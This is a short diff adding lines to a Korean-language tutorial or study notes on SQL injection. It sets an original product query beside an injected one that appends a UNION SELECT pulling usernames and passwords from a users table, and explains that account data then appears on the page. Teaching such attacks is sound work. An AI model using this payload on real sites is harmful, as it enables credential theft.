@@ -183,3 +183,15 @@ SELECT title, content FROM products WHERE id = '1' UNION SELECT username, passwo
 ```
 이렇게 하면 원래 결과 대신(또는 함께) `users` 테이블의 데이터가 나타남.
 
+**실제 쿼리 예시**
+원래 쿼리 : 
+```
+SELECT name, description FROM products WHERE id = '1';
+```
+공격 후 :
+```
+SELECT name, description FROM products WHERE id = '1' UNION SELECT username, password FROM USERS -- -;
+```
+화면에는 상품 정보와 함께(또는 대신) 사용자 계정 정보가 출력됨.
+
+**자주 보이는 쿼리**
